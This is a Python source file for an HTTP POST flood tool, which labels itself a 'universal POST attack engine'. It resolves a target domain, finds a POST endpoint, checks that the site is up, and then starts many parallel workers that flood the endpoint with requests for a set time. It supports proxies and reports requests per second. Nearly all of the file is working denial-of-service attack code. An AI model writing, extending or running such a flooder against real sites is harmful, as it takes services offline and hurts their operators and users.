import asyncio
import logging
import urllib.parse
from typing import List, Optional, Dict, Any

from src.core.infrastructure.universal_benchmark import UniversalBenchmark
from src.core.infrastructure.fixed_metrics import FixedMetrics
from src.core.infrastructure.parallel_worker import parallel_worker
from src.core.analysis.universal_adapter import UniversalTargetAdapter
from src.utils.dns_resolver import pre_resolve_domain

class HTTPPostFlood:
    """
    UNIVERSAL POST ATTACK ENGINE v2.1.
    High-performance, fire-and-forget, and metrics-integrated.
    """
    def __init__(self, target_url: str, proxies: Optional[List[str]] = None, headers: Optional[dict] = None, adaptive_ctrl=None, shared_metrics=None):
        if not target_url.startswith("http"):
            target_url = f"https://{target_url}"
        self.original_target = target_url
        self.domain = urllib.parse.urlparse(target_url).netloc
        self.proxies = proxies
        self.logger = logging.getLogger("HTTPPostFlood")
        self.adaptive_ctrl = adaptive_ctrl
        self.metrics = shared_metrics or FixedMetrics()
        self._stop_event = asyncio.Event()
        self.resolved_ip = None

    async def start(self, duration: int, threads: int = 50):
        self.logger.info(f"[*] Initializing Universal POST Engine v2.1 for {self.domain}")
        
        try:
            res = pre_resolve_domain(self.domain)
            self.resolved_ip = res["ip"]
        except Exception as e:
            self.logger.error(f"[-] DNS Resolution failed: {e}")
            return

        adapter = UniversalTargetAdapter(self.domain, {})
        endpoints = adapter.discover_endpoints()
        # Prefer POST endpoints
        target_ep = next((ep for ep in endpoints if ep["method"] == "POST"), endpoints[0])
        
        attack_path = urllib.parse.urlparse(target_ep["url"]).path
        
        async with UniversalBenchmark(self.domain, self.resolved_ip, threads) as engine:
            # 4. Strict Health Check
            health = await engine.health_check()
            if not health["ok"]:
                self.logger.critical(f"[-] Health check FAILED: {health.get('error')}")
                return
            
            self.logger.info(f"[+] Health check OK: HTTP {health['status']} in {health['latency_ms']:.0f}ms")

            # 6. Attack Execution
            attack_url = f"https://{self.domain}{attack_path}"
            self.logger.info(f"[*] Launching {threads} parallel POST workers on: {attack_url}")
            
            workers = [
                asyncio.create_task(
                    parallel_worker(
                        engine.session, 
                        attack_url, 
                        self.domain, 
                        self.metrics, 
                        self._stop_event, 
                        self.adaptive_ctrl,
                        method="POST"
                    )
                )
                for _ in range(threads)
            ]
            
            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=duration)
            except asyncio.TimeoutError:
                pass
            finally:
                self.stop()
                await asyncio.gather(*workers, return_exceptions=True)
                
                # 7. Final Summary
                summary = self.metrics.get_summary()
                self.logger.info("\n" + "="*50)
                self.logger.info(f"UNIVERSAL POST SUMMARY — {self.domain}")
                self.logger.info(f"Attempted: {summary['attempted']}")
                self.logger.info(f"Completed: {summary['completed']} | Failed: {summary['failed']}")
                self.logger.info(f"Performance: {summary['rps']} RPS | Avg Lat: {summary['avg_latency_ms']:.0f}ms")
                self.logger.info("="*50)

    def stop(self):
        self._stop_event.set()
